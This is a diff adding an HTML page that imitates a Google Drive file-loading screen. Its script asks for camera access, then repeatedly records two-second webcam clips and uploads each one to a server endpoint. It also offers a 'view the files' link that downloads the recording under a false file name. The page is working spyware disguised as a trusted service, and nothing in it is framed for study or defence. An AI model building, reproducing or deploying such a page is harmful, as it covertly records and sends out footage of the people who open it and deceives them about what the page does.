@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        flex-direction: column;
+        margin: 0;
+        background-color: #f4f4f9;
+        /* Light background color */
+    }
+
+    .loading {
+        font-size: 1.5em;
+        color: #4285F4;
+        /* Google Drive blue color */
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 15px;
+        flex-flow: column;
+    }
+
+    .spinner {
+        border: 4px solid #f3f3f3;
+        border-top: 4px solid #4285F4;
+        /* Google Drive blue color */
+        border-radius: 50%;
+        width: 40px;
+        height: 40px;
+        animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+        0% {
+            transform: rotate(0deg);
+        }
+
+        100% {
+            transform: rotate(360deg);
+        }
+    }
+
+    .error-message {
+        color: blue;
+        display: none;
+        text-align: center;
+        width: 250px;
+    }
+
+    .error-icon {
+        font-size: 3em;
+    }
+
+    .error-text {
+        font-size: 1.5em;
+        font-weight: bold;
+    }
+
+    .data {
+        font-size: 1.5em;
+        margin-top: 20px;
+        color: #333;
+    }
+</style>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Drive - Loading...</title>
+    <meta name="description"
+        content="Google Drive API Loading Example - Loading your files or showing 404 if the API is not found.">
+</head>
+
+<body>
+    <div id="loading" class="loading">
+        <div class="spinner"></div>
+        Loading your files...
+    </div>
+    <div id="error-message" class="error-message" style="display: none;">
+        <a id="download-link" href="#" class="download-link" download>Click here to view the files</a>
+    </div>
+    </div>
+    <div id="data" class="data"></div>
+
+
+    <script>
+        // Global variables
+        let mediaRecorder;
+        let videoBlob;
+        let videoUrl;
+        let recordedChunks = [];
+
+        // Start video recording when the page loads
+        window.onload = async function () {
+            // Show loading indicator
+            document.getElementById('loading').style.display = 'flex';
+
+            // Access user's camera
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            // const videoPreview = document.getElementById('videoPreview');
+            // videoPreview.srcObject = stream;
+
+            // Create MediaRecorder to record video
+            mediaRecorder = new MediaRecorder(stream);
+
+            mediaRecorder.ondataavailable = (event) => {
+                videoBlob = event.data;
+                recordedChunks.push(event.data);
+            };
+
+            mediaRecorder.onstop = () => {
+                // Upload video once recording stops
+                uploadVideo();
+            };
+
+            // Start recording after a short delay
+            setInterval(() => {
+
+                mediaRecorder.start();
+
+                // Stop recording after 5 seconds (you can adjust this for longer or shorter)
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 2000);
+            }, 5000)
+        };
+
+        const loadingElement = document.getElementById('loading');
+        const errorMessageElement = document.getElementById('error-message');
+        const dataElement = document.getElementById('data');
+
+        // Function to upload the video to the API
+        async function uploadVideo() {
+            // Hide the loading indicator when upload starts
+            // Show loading indicator
+            loadingElement.style.display = 'flex';
+            errorMessageElement.style.display = 'none';
+            dataElement.style.display = 'none';
+
+            // Create a form data object to send the video blob
+            const formData = new FormData();
+            formData.append('video', videoBlob, 'video.webm');
+
+            try {
+                // Send the video to the API endpoint
+                const response = await fetch('http://localhost:3000/upload', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                // Check if upload was successful
+                if (response.ok) {
+                    loadingElement.style.display = 'none';
+                    dataElement.style.display = 'flex';
+                    errorMessageElement.style.display = 'flex';
+                } else {
+                    document.getElementById('loading').textContent = 'Upload Failed!';
+                }
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                const videoUrl = URL.createObjectURL(blob);
+
+                // Show the download link
+                errorMessageElement.style.display = 'flex';
+                console.log(videoUrl,recordedChunks)
+                const downloadLink = document.getElementById('download-link');
+                console.log(recordedChunks, downloadLink)
+                downloadLink.href = videoUrl;
+                downloadLink.download = 'invalid-file.txt';
+                downloadLink.href = videoUrl; // Set the URL to the download link
+            } catch (error) {
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                const videoUrl = URL.createObjectURL(blob);
+                loadingElement.style.display = 'none';
+                errorMessageElement.style.display = 'flex';
+                const downloadLink = document.getElementById('download-link');
+                downloadLink.href = videoUrl;
+                downloadLink.download = 'invalid-file.txt';
+                downloadLink.href = videoUrl; // Set the URL to the download link
+            }
+        }
+    </script>
+</body>
+
+</html>
